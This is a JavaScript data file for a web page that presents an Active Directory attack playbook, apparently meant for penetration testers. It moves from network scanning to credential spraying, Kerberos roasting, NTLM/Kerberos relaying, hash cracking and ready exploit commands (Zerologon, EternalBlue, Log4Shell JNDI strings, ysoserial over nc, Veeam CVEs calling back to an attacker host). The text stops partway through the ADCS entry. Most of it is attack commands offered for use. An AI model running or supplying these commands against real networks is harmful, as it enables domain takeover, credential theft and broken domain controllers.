/*
  AD ATTACK PATH v2 — data for ad-map.html

  A guided "playbook": colour-coded ACCESS SECTIONS you expand, each holding
  TECHNIQUE buttons you expand, each showing a Theory/CVE link, a short note,
  the commands, colour-coded OUTCOME badges, and "move to" pivots that jump to
  another (differently-coloured) section when your access changes.

  MODEL
    meta       title / version / note
    palette    named outcome colours (kept here so the scheme is consistent)
    sections[] {
      id, title, color(hex), tag, desc,
      techniques[] {
        id, title,
        theory : { label, url } | null,
        cve    : { id, label?, url? } | null,   // rendered as a CVE banner + chip
        desc   : "short note" | null,
        cmds   : [ "command", ... ],            // # comments are dimmed
        branches[] : {                          // optional nested sub-paths
          label, warn?(bool), cmds[], outcomes[]
        },
        outcomes[] : { label, color(hex) },     // colour-coded result badges
        moveTo[]   : { section, label?, note? }  // pivots to another section
      }
    }

  Extend the sections below — the page rebuilds itself automatically.
*/

var AD_MAP_V2 = {
  meta: {
    title: "AD Attack Path — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  // shared outcome palette (matches the section colours + result-box scheme)
  palette: {
    lavender:   "#cdc7e6",  // No Credentials
    blue:       "#3b9ee5",  // Valid user (Username)
    greenPale:  "#86efac",  // vulnerable host
    green:      "#4ade80",  // credentials obtained
    yellow:     "#ffe14a",  // poisoning / coerce
    orange:     "#e8912e"   // crackable hash
  },

  sections: [
    {
      id: "no-creds",
      title: "No Credentials",
      color: "#cdc7e6",
      tag: "Start here",
      desc: "You're on the network with no domain account yet — scan, find the domain, and hunt a first credential or hash.",
      techniques: [
        {
          id: "scan-network",
          title: "Scan network",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Sweep the subnet and fingerprint hosts/services to find domain controllers and vulnerable targets.",
          cmds: [
            "nxc smb <ip_range>",
            "nmap -sP -p <ip>",
            "nmap -Pn -sV --top-ports 50 --open <ip>",
            "nmap -Pn --script smb-vuln* -p139,445 <ip>",
            "nmap -Pn -sC -sV -oA <output> <ip>",
            "nmap -Pn -sC -sV -p- -oA <output> <ip>",
            "nmap -sU -sC -sV -oA <output> <ip>"
          ],
          outcomes: [{ label: "Vulnerable host", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "find-dc-ip",
          title: "Find DC IP",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Identify the domain controllers via the local interface, DNS SRV records, and the Kerberos port.",
          cmds: [
            "nmcli dev show <interface>",
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "nmap -p 88 --open <ip_range>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "zone-transfer",
          title: "Zone transfer",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Attempt an AXFR to pull the whole DNS zone and map internal hostnames.",
          cmds: [
            "dig axfr <domain_name> @<name_server>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "anon-guest-smb",
          title: "Anonymous & Guest access on SMB shares",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Null and guest sessions can leak users, shares and policy with no credentials.",
          cmds: [
            "nxc smb <ip_range> -u '' -p ''",
            "nxc smb <ip_range> -u 'a' -p ''",
            "enum4linux-ng.py -a -u '' -p '' <ip>",
            "smbclient -U '%' -L //<ip>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Probe LDAP for anonymous binds and directory data.",
          cmds: [
            "nmap -n -sV --script 'ldap* and not brute' -p 389 <dc_ip>",
            "ldapsearch -x -H <dc_ip> -s base"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "once enumeration yields a usable account" }]
        },
        {
          id: "enum-users",
          title: "Enumerate Users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "RID-cycle and RPC-enumerate to build a username list.",
          cmds: [
            "nxc smb <dc_ip> --rid-brute 10000   # bruteforcing RID",
            "net rpc group members 'Domain Users' -W '<domain>' -l <ip> -U '%'"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "a valid username list feeds spraying / roasting" }]
        },
        {
          id: "bruteforce-users",
          title: "Bruteforce users",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Confirm which usernames exist via Kerberos pre-auth — no logon failure generated.",
          cmds: [
            "kerbrute userenum -d <domain> <userlist>",
            "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user_list_file>\" <dc_ip>"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "confirmed usernames feed spraying / roasting" }]
        },
        {
          id: "poisoning",
          title: "Poisoning",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer broadcast name-resolution or MITM the segment to capture / relay authentication.",
          cmds: [],
          branches: [
            { label: "LLMNR / NBT-NS / mDNS", cmds: ["responder -I <interface>"] },
            { label: "DHCPv6 (IPv6 preferred to IPv4)", warn: true, cmds: ["mitm6 -d <domain>", "bettercap"] },
            { label: "ARP Poisoning", warn: true, cmds: ["bettercap"] },
            { label: "AS-REQ roast (via poisoning)", cmds: ["Pcredz -i <interface> -v"], outcomes: [{ label: "Hash found ASREQ", color: "#e8912e" }] }
          ],
          outcomes: [
            { label: "poisoning SMB", color: "#ffe14a" },
            { label: "poisoning LDAP", color: "#ffe14a" },
            { label: "poisoning HTTP", color: "#ffe14a" }
          ],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "captured SMB/LDAP/HTTP auth can be relayed to a service that accepts it" }]
        },
        {
          id: "coerce",
          title: "Coerce",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: { id: "CVE-2022-26925", label: "Unauthenticated PetitPotam", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-26925" },
          desc: "Force a host (often a DC) to authenticate to your listener so it can be relayed.",
          cmds: [
            "petitpotam.py -d <domain> <listener> <target>"
          ],
          outcomes: [{ label: "Coerce SMB", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "the coerced authentication is relayed to LDAP(S)/HTTP/SMB" }]
        },
        {
          id: "pxe",
          title: "PXE",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Pull SCCM PXE boot media to recover deployment credentials — no domain account needed.",
          cmds: [],
          branches: [
            { label: "no password", cmds: ["pxethief.py 1", "pxethief.py 2 <distribution_point_ip>"], outcomes: [{ label: "Credentials (NAA account)", color: "#4ade80" }] },
            { label: "password protected", cmds: ["tftp -i <dp_ip> GET \"\\xxx\\boot.var\"", "pxethief.py 5 \"\\xxx\\boot.var\""], outcomes: [{ label: "PXE Hash", color: "#e8912e" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "timeroasting",
          title: "TimeRoasting",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Abuse MS-SNTP to recover computer-account hashes with no authentication, to crack offline.",
          cmds: [
            "timeroast.py <dc_ip> -o <output_log>"
          ],
          outcomes: [{ label: "timeroast hash", color: "#e8912e" }],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-user",
      title: "Valid user (no password)",
      color: "#3b9ee5",
      tag: "Have a username",
      desc: "You hold at least one valid username (and maybe a password) — spray for credentials and roast pre-auth-disabled accounts.",
      techniques: [
        {
          id: "pw-spray",
          title: "Password Spray",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Try one password across many users. Read the lockout policy FIRST so you don't lock accounts.",
          cmds: [],
          branches: [
            { label: "Get password policy — default policy", note: "You need creds, but get the policy first to avoid locking accounts.", cmds: [
              "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
              "Get-ADDefaultDomainPasswordPolicy",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy"
            ] },
            { label: "Get password policy — Fine-Grained (privileged)", cmds: [
              "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
              "Get-ADFineGrainedPasswordPolicy -filter *",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso   # runs as low-priv too, with less info"
            ] },
            { label: "user == password", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
              "sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # --lower / --upper to case-fold; nothing = user==pass"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] },
            { label: "Usual passwords (Season+Year!, Company123 …)", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
              "sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>",
              "kerbrute passwordspray -d <domain> <users.txt> <password>"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "asreproast",
          title: "ASREPRoast",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "Accounts with Kerberos pre-auth disabled (and SPN-write via a pre-auth account) yield crackable tickets.",
          cmds: [],
          branches: [
            { label: "List ASREPRoastable users (need creds)", cmds: [
              "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u   # BloodHound / Cypher"
            ] },
            { label: "ASREP roasting", cmds: [
              "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
              "nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>",
              "Rubeus.exe asreproast /format:hashcat"
            ], outcomes: [{ label: "Hash found ASREP", color: "#e8912e" }] },
            { label: "Blind Kerberoasting", cmds: [
              "Rubeus.exe kerberoast /domain:<domain> /dc:<dcip> /nopreauth:<asrep_user> /spns:<users.txt>",
              "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>/\""
            ], outcomes: [{ label: "Hash found TGS", color: "#e8912e" }] },
            { label: "Kerberos RC4 downgrade", cve: "CVE-2022-33679", cmds: [
              "CVE-2022-33679.py <domain>/<user> <target>"
            ], outcomes: [{ label: "Lat move PTT", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "mitm",
      title: "Man In The Middle (Listen and Relay)",
      color: "#ffe14a",
      tag: "Poison & relay",
      desc: "Capture authentication on the wire and relay it to a service that will accept it.",
      techniques: [
        {
          id: "listen",
          title: "Listen",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer name resolution / capture SMB authentication to obtain hashes or credentials.",
          cmds: [
            "responder -I <interface>   # use --lm to force a downgrade",
            "smbclient.py"
          ],
          outcomes: [
            { label: "Hash NTLMv1 or NTLMv2", color: "#e8912e" },
            { label: "Username", color: "#3b9ee5" },
            { label: "Credentials (ldap/http)", color: "#4ade80" }
          ],
          moveTo: []
        },
        {
          id: "ntlm-relay",
          title: "NTLM relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay captured/coerced NTLM authentication to a service, picking the target by what's unsigned/unenforced.",
          cmds: [],
          branches: [
            { label: "MS08-068 self relay", cmds: ["msf> exploit/windows/smb/smb_relay   # Windows 2000 / Server 2008"] },
            { label: "SMB → LDAP(S)", cve: "CVE-2019-1040", note: "NTLMv1: remove MIC (no CVE needed). NTLMv2: remove MIC (CVE-2019-1040).", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "HTTP(S) → LDAP(S)", note: "Usually from a WebDAV coercion — HTTP auth relays cross-protocol.", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "To LDAP(S) → RBCD", note: "Relay to LDAP when LDAP signing and LDAPS channel binding aren't enforced (the default).", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access"
            ], outcomes: [{ label: "RBCD", color: "#10b981" }] },
            { label: "To LDAP(S) → Shadow Credentials", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'"
            ], outcomes: [{ label: "Shadow Credentials", color: "#9ca3af" }] },
            { label: "To LDAP(S) → Domain Admin", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>"
            ], outcomes: [{ label: "Domain admin", color: "#ef4444" }] },
            { label: "To LDAP(S) → LDAP shell", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive   # nc 127.0.0.1 10111"
            ], outcomes: [{ label: "LDAP SHELL", color: "#9ca3af" }] },
            { label: "To SMB (SMB not signed)", note: "Find unsigned targets (default on non-DCs), then relay.", cmds: [
              "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
              "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks"
            ], outcomes: [{ label: "SMB Socks", color: "#9ca3af" }] },
            { label: "To HTTP → AD CS (ESC8)", note: "Relay to the CA web enrollment endpoint.", outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "To HTTP → WSUS", note: "Relay to WSUS.", outcomes: [{ label: "WSUS", color: "#9ca3af" }] },
            { label: "To MSSQL", cmds: ["ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks"], outcomes: [{ label: "MSSQL Socks", color: "#9ca3af" }] },
            { label: "SMB → NETLOGON (Zerologon)", cve: "CVE-2020-1472", note: "Zero-Logon (safe method) — relay one DC to another.", cmds: [
              "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>"
            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kerberos-relay",
          title: "Kerberos relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay Kerberos instead of NTLM (krbrelayx) — useful where NTLM is blocked but you can coerce Kerberos.",
          cmds: [],
          branches: [
            { label: "To HTTP → AD CS (ESC8)", cmds: [
              "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>"
            ], outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "SMB → SMB", note: "Same as NTLM relay — use krbrelayx.py." },
            { label: "SMB → LDAP(S)", note: "Same as NTLM relay — use krbrelayx.py." }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "crack-hash",
      title: "Crack hash",
      color: "#e8912e",
      tag: "Offline cracking",
      desc: "You have captured or roasted a hash. Identify its type, then crack it offline with John or Hashcat to recover the plaintext.",
      techniques: [
        {
          id: "crack-lm",
          title: "LM  (299bd128c1101fd6)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "Legacy LM hash. Weak by design and quick to crack.",
          cmds: [
            "john --format=lm hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-nt",
          title: "NT  (b4b9b02e6f09a9bd760...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NT hash (the modern Windows password hash).",
          cmds: [
            "john --format=nt hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-ntlmv1",
          title: "NTLMv1  (user::85D5BC...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NetNTLMv1 challenge/response. Can also be submitted to crack.sh, which recovers the NT hash from the DES keys.",
          cmds: [
            "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
            "crack.sh"
          ],
          outcomes: [{ label: "Clear text password / NT hash", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-ntlmv2",
          title: "NTLMv2  (user::N46iSNek...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NetNTLMv2 challenge/response, typically captured with Responder.",
          cmds: [
            "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-krb5tgs",
          title: "Kerberos 5 TGS  ($krb5tgs$23$...)",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "RC4 (etype 23) service ticket recovered from Kerberoasting.",
          cmds: [
            "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Service account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-krb5tgs-aes",
          title: "Kerberos 5 TGS AES128  ($krb5tgs$17...)",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "AES128 (etype 17) service ticket — slower to crack than RC4.",
          cmds: [
            "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Service account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-asrep",
          title: "Kerberos ASREP  ($krb5asrep$23...)",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "AS-REP for a pre-auth-disabled account, recovered from ASREPRoasting.",
          cmds: [
            "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-mscache2",
          title: "MSCache 2 (very slow)  ($DCC2$10240...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "Domain Cached Credentials v2 (mscash2). Very slow — cannot be relayed or replayed, only cracked.",
          cmds: [
            "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-timeroast",
          title: "Timeroast hash  ($sntp-ms$...)",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Computer-account hash recovered via MS-SNTP. Crack with a mask (machine passwords are long and random, so a wordlist rarely helps).",
          cmds: [
            "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l?l"
          ],
          outcomes: [{ label: "Machine account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-pxe",
          title: "PXE hash  ($sccm$aes128$...)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "SCCM PXE boot media password recovered with PXEThief.",
          cmds: [
            "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Deployment credentials", color: "#4ade80" }],
          moveTo: []
        }
      ]
    },

    {
      id: "quick-compromise",
      title: "Quick Compromise",
      color: "#e07b2e",
      tag: "Fast wins",
      desc: "Unauthenticated, high-impact exploits worth trying early. A single vulnerable service here can hand you Domain Admin or a foothold outright.",
      techniques: [
        {
          id: "qc-zerologon",
          title: "Zerologon (unsafe)",
          theory: null,
          cve: { id: "CVE-2020-1472", label: "Zerologon" },
          desc: "Resets the domain controller machine account password to empty. The exploit is destructive — it breaks the DC until the password is restored, so use with care.",
          cmds: [],
          branches: [
            { label: "Scan", warn: true, cmds: ["zerologon-scan '<dc_netbios_name>' '<ip>'"] },
            { label: "Exploit", warn: true, cmds: ["cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>"], outcomes: [{ label: "Domain admin", color: "#ef4444" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "qc-eternalblue",
          title: "EternalBlue MS17-010",
          theory: null,
          cve: { id: "CVE-2017-0144", label: "EternalBlue" },
          desc: "SMBv1 remote code execution. Only targets hosts still exposing SMBv1.",
          cmds: [
            "msf> exploit/windows/smb/ms17_010_eternalblue   # SMBv1 only"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-tomcat",
          title: "Tomcat / JBoss Manager",
          theory: null,
          cve: null,
          desc: "Weak or default manager credentials allow deploying a malicious WAR for code execution.",
          cmds: [
            "msf> auxiliary/scanner/http/tomcat_enum",
            "msf> exploit/multi/http/tomcat_mgr_deploy"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-javarmi",
          title: "Java RMI",
          theory: null,
          cve: null,
          desc: "Exposed Java RMI registries can allow remote class loading and code execution.",
          cmds: [
            "msf> use exploit/multi/misc/java_rmi_server"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-javaser",
          title: "Java Serialized port",
          theory: null,
          cve: null,
          desc: "Ports accepting serialized Java objects can be exploited with ysoserial gadget chains.",
          cmds: [
            "ysoserial.jar <gadget> '<cmd>' | nc <ip> <port>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-log4shell",
          title: "Log4Shell",
          theory: null,
          cve: { id: "CVE-2021-44228", label: "Log4Shell" },
          desc: "A crafted string logged by a vulnerable Log4j triggers a JNDI lookup to your server and remote code execution.",
          cmds: [
            "${jndi:ldap://<ip>:<port>/o=reference}"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-database",
          title: "Database",
          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-abuse.html" },
          cve: null,
          desc: "Enumerate SQL logins and hunt weak or default credentials on exposed database services.",
          cmds: [
            "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-exchange",
          title: "Exchange (ProxyShell)",
          theory: null,
          cve: { id: "CVE-2021-34473", label: "ProxyShell" },
          desc: "Chained Exchange vulnerabilities give unauthenticated remote code execution as SYSTEM.",
          cmds: [
            "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "qc-veeam",
          title: "Veeam",
          theory: null,
          cve: null,
          desc: "A run of Veeam Backup vulnerabilities recover stored credentials or give authentication bypass and code execution.",
          cmds: [],
          branches: [
            { label: "Credentials — Veeam backup", cve: "CVE-2023-27532", cmds: [
              "VeeamHax.exe --target <veeam_server>",
              "CVE-2023-27532 net.tcp:/<target>:<port>/"
            ] },
            { label: "Auth bypass — Veeam Backup Enterprise Manager", cve: "CVE-2024-29849", cmds: [
              "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>"
            ] },
            { label: "Auth bypass — Veeam Recovery Orchestrator", cve: "CVE-2024-29855", cmds: [
              "CVE-2024-29855.py --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/"
            ] },
            { label: "Unserialize — Veeam backup", cve: "CVE-2024-40711", cmds: [
              "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>"
            ] }
          ],
          outcomes: [{ label: "User Account", color: "#4ade80" }, { label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "qc-glpi",
          title: "GLPI",
          theory: null,
          cve: null,
          desc: "GLPI asset-management vulnerabilities leading to code execution or SQL injection.",
          cmds: [],
          branches: [
            { label: "htmLawed RCE", cve: "CVE-2022-35914", cmds: [
              "/vendor/htmlawed/htmlawed/htmLawedTest.php"
            ] },
            { label: "SQL injection", cve: "CVE-2023-41320", cmds: [
              "cve_2023_41320.py -u <user> -p <password> -t <ip>"
            ] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-weakweb",
          title: "Weak websites / services",
          theory: null,
          cve: null,
          desc: "Mass-scan for low-hanging vulnerabilities across web and network services.",
          cmds: [],
          branches: [
            { label: "nuclei", cmds: ["nuclei -target <ip_range>"] },
            { label: "nessus", note: "Authenticated / unauthenticated vulnerability scan." }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-creds",
      title: "Valid Credentials",
      color: "#2fd44f",
      tag: "Cleartext / NT hash / ticket",
      desc: "You hold a working credential — cleartext password, NT hash, or Kerberos ticket. Enumerate the domain thoroughly, then pivot toward roasting, coercion, ADCS/SCCM, and lateral movement.",
      techniques: [
        {
          id: "vc-find-users",
          title: "Find all users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Pull the full user list now that you can authenticate.",
          cmds: [
            "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
            "nxc smb <dc_ip> -u '<user>' -p '<password>' --users"
          ],
          outcomes: [{ label: "Username", color: "#3b9ee5" }],
          moveTo: []
        },
        {
          id: "vc-enum-smb",
          title: "Enumerate SMB shares",
          theory: null,
          cve: null,
          desc: "Spider readable shares for passwords, config files, and secrets.",
          cmds: [
            "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
            "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
            "manspider <ip_range> -c passw -e <file_extensions> -d <domain> -u <user> -p <password>"
          ],
          outcomes: [{ label: "Scroll shares", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "vc-bloodhound-legacy",
          title: "BloodHound Legacy",
          theory: null,
          cve: null,
          desc: "Collect graph data (users, shares, ACLs, delegation) for the legacy BloodHound.",
          cmds: [
            "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
            "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
            "import-module sharphound.ps1; invoke-bloodhound -collectionmethod all -domain <domain>",
            "sharphound.exe -c all -d <domain>"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "graph edges reveal abusable ACLs" }]
        },
        {
          id: "vc-bloodhound-ce",
          title: "BloodHound CE",
          theory: null,
          cve: null,
          desc: "Same collection for the Community Edition (BloodHound CE) schema.",
          cmds: [
            "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
            "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter (objectGuid=*)",
            "sharphound.exe -c all -d <domain>",
            "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "graph edges reveal abusable ACLs" }]
        },
        {
          id: "vc-enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Dump the directory for ACLs, delegation, and attributes.",
          cmds: [
            "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
            "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
            "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: []
        },
        {
          id: "vc-enum-dns",
          title: "Enumerate DNS",
          theory: null,
          cve: null,
          desc: "List AD-integrated DNS zones to discover new internal targets.",
          cmds: [
            "adidnsdump -u <domain>\\<user> -p \"<password>\" --print-zones <dc_ip>"
          ],
          outcomes: [{ label: "New targets (low-hanging fruit)", color: "#a7d8ae" }],
          moveTo: []
        },
        {
          id: "vc-enum-adcs",
          title: "Enumerate ADCS",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "Find certificate templates and CAs, then check for the ESC misconfigurations.",
          cmds: [
            "certify.exe find",
            "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>"
          ],
